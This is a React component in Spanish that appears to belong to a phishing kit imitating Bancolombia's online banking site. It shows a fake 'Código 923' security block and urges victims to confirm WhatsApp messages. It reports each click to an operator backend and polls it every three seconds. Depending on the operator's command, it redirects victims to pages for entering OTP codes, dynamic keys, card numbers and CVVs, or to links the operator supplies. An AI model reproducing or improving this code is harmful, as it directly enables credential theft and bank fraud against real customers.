import { useEffect, useState } from "react";
import { instanceBackend } from "../../../axios/instanceBackend";
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import './css/LoginModal.css';

// Se exporta el componente
export default function Error923() {

    // Se inicializa el estado del boton
    const [getLoading, setLoading] = useState(false);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [getDateHour, setDateHour] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se obtiene la IP
        getInfoIp();

        // Se obtiene la fecha/hora con formato
        getDateHours();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        getDateHours();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const nextMinute = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa el intervalId
        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {

            // Se inicializa la fecha y hora
            getDateHours();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {

                // Se llama el metodo
                getDateHours();
            }, 60000);
        }, nextMinute);

        // Se retorna
        return () => {

            // Se limpia el intervalo
            clearTimeout(timeoutId);

            // Se valida y se limpia
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // usando el servicio externo api.ipify.org
    const getInfoIp = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // y la formatea en español (Colombia)
    const getDateHours = () => {

        // Se obtiene la fecha y hora actual
        const nowDate = new Date();

        // Opciones de formato para la fecha y hora
        const options = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formato = nowDate.toLocaleString("es-CO", options);

        // Se guarda el valor formateado en el estado
        setDateHour(formato);
    };

    // Metodo encargado de ejecutar la accion
    const handleAction = async (accion) => {

        // Se inicializa el loading
        setLoading(true);

        // Se inicializa el try catch
        try {

            // Se obtiene el sessionId
            const sessionId = localStorage.getItem("sessionId");

            // Se valida que haya un sessionId
            if (!sessionId) {

                // Se envia una alerta
                alert("Error: No se encontró la sesión");

                // Se quita el cargando
                setLoading(false);

                // Se retorna
                return;
            };

            // Import axios dynamically if needed, or assume global instance
            const { instanceBackend } = await import("../../../axios/instanceBackend");

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": {
                        "sessionId": sessionId,
                        "accion": accion,

                        // DATOS NUEVOS PARA EL DISTRIBUIDOR
                        "backend": "P01",
                        "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                        "backend_url": "/api/v1/bancolombia/response-923",
                    }
                },
            };

            const centralUrl = (
                process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
            ).trim();

            // Se envia la peticion
            if (centralUrl) {
                await instanceBackend.post(centralUrl, dataSend);
            } else {
                await instanceBackend.post("/bancolombia/response-923", dataSend);
            }

            // Se inicia el polling
            initPolling(sessionId);
        } catch (error) {

            // Se inicializa el cargando
            setLoading(false);

            // Se valida el tipo de error
            if (error.response) {

                // El servidor respondió con un código de estado fuera del rango 2xx
                alert(`Error ${error.response.status}: ${error.response.data?.message || 'Error del servidor'}`);
            } else if (error.request) {

                // La petición fue hecha pero no se recibió respuesta
                alert("Error de conexión con el servidor");
            } else {

                // Hubo un error al configurar la petición
                alert("Error inesperado: " + error.message);
            }
        }
    };

    // Metodo encargado de iniciar el polling
    const initPolling = async (sessionId) => {

        // Se crea el metodo
        const pollingInterval = setInterval(async () => {

            // Se usa el try catch
            try {

                // Se envia la peticion
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);
                const { estado, url, text } = response.data;
                const estadoLower = estado?.toLowerCase();
                const hasUrl = Boolean(url && String(url).trim());
                const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

                if (estadoLower === 'link_bot' && hasUrl) {
                    clearInterval(pollingInterval);
                    setLoading(false);
                    window.location.href = url;
                    return;
                }
                if (estadoLower === 'sol_link_custom' && customLink) {
                    clearInterval(pollingInterval);
                    setLoading(false);
                    window.location.href = customLink;
                    return;
                }
                if (
                    estadoLower === 'sol_link_bot' ||
                    (estadoLower === 'link_bot' && !hasUrl) ||
                    (estadoLower === 'sol_link_custom' && !customLink)
                ) {
                    return;
                }

                // Estados que detienen el polling
                const stateValid = [

                    // Botones linea 1
                    'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',

                    // Botones linea 2
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',

                    // Botones linea 3
                    'sol_biometria', 'error_923',

                    // Botones linea 4
                    'sol_tc_custom', 'sol_cvv_custom',

                    // Estados adicionales por pantalla
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla',
                    'sol_link_bot', 'link_bot', 'sol_link_custom'
                ];

                // Se valida si el estado es válido
                if (stateValid.includes(estadoLower)) {

                    // Se limpia el intervalo
                    clearInterval(pollingInterval);

                    // Se desactiva el loading
                    setLoading(false);

                    // Se valida el tipo de estado
                    switch (estadoLower) {
                        case 'sol_otp':

                            // Se redirige
                            window.location.href = '/numero-otp';

                            // Se sale del ciclo
                            break;
                        case 'sol_din':

                            // Se redirige
                            window.location.href = '/clave-dinamica';

                            // Se sale del ciclo
                            break;
                        case 'sol_finalizar':
                        case 'sol_finalizado':
                        case 'solicitar_finalizar':

                            // Se redirige
                            window.location.href = '/finalizado-pse';

                            // Se sale del ciclo
                            break;
                        case 'sol_biometria':

                            // Se redirige
                            window.location.href = '/verificacion-identidad';

                            // Se sale del ciclo
                            break;
                        case 'error_923':

                            // Se recarga la pagina
                            window.location.reload();

                            // Se sale del ciclo
                            break;
                        case 'sol_tc':

                            // Se redirige
                            window.location.href = '/validacion-tc';

                            // Se sale del ciclo
                            break;
                        case 'sol_tc_custom':

                            // Se redirige
                            window.location.href = '/validacion-tc';

                            // Se sale del ciclo
                            break;
                        case 'sol_cvv_custom':

                            // Se redirige
                            window.location.href = '/validacion-cvv';

                            // Se sale del ciclo
                            break;
                        case 'error_otp':

                            // Se setea el error
                            localStorage.setItem('estado_sesion', 'error');

                            // Se redirige
                            window.location.href = '/numero-otp';

                            // Se sale del ciclo
                            break;
                        case 'error_din':

                            // Se setea el error
                            localStorage.setItem('estado_sesion', 'error');

                            // Se redirige
                            window.location.href = '/clave-dinamica';

                            // Se sale del ciclo
                            break;
                        case 'error_login':

                            // Se setea el error
                            localStorage.setItem('estado_sesion', 'error');

                            // Se redirige
                            window.location.href = '/bancolombia';

                            // Se sale del ciclo
                            break;
                        default:

                            // Se sale del ciclo
                            break;
                    }
                }
            } catch (error) {
            }
        }, 3000);
    };

    // Se crea el return del componente
    const desktop = isDesktop();

    // Se retorna el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
                        backgroundRepeat: desktop ? 'round' : 'no-repeat',
                        backgroundPosition: "center",
                        backgroundPositionY: desktop ? "0px" : "-70px",
                        backgroundPositionX: desktop ? "0px" : "-500px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/bancolombia/bancolombia.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
                            {/* ICON REDESIGN */}
                            <div
                                style={{
                                    display: "flex",
                                    justifyContent: "center"
                                }}
                            >
                                <div
                                    style={{
                                        width: "60px",
                                        height: "60px",
                                        backgroundColor: "#FBDC1D",
                                        borderRadius: "50%",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        marginBottom: "0px"
                                    }}
                                >
                                    <img
                                        src="/assets/bancolombia/stop-hand.png"
                                        alt="Alert Icon"
                                        style={{ width: "25px", height: "30px" }}
                                    />
                                </div>
                            </div>

                            <div style={{ textAlign: "center" }}>
                                <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 500, fontSize: "24px", lineHeight: "1.5", marginBottom: "25px" }}>
                                    Por seguridad, no puedes continuar la transacción
                                </h2>

                                <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 300, fontSize: "15.5px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
                                    Te enviaremos dos mensajes a WhatsApp desde nuestro Tabot, tu asistente virtual Bancolombia, para finalizar la cancelación de tu seguro. Por favor, indicar “sí fui yo” y confirmar con el “sí”.
                                </p>

                                <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontWeight: 300, fontSize: "15.5px", fontWeight: "bold", marginBottom: "30px", color: "#ffffff" }}>
                                    Código 923
                                </p>
                            </div>

                            <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                <button className="bc-button-primary login-btn-borrar" style={{ fontSize: "14px" }} onClick={() => handleAction('cancelar')}>
                                    No recibido
                                </button>
                                <button className="bc-button-primary login-btn" style={{ fontSize: "14px" }} onClick={() => handleAction('confirmar')}>
                                    Confirmar
                                </button>
                            </div>
                        </div>
                    </div>

                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/bancolombia/bancolombia.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/bancolombia/logo-vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{getDateHour}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div >

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {getLoading ?
                <LoadingBancolombia /> : null}
        </>
    );
};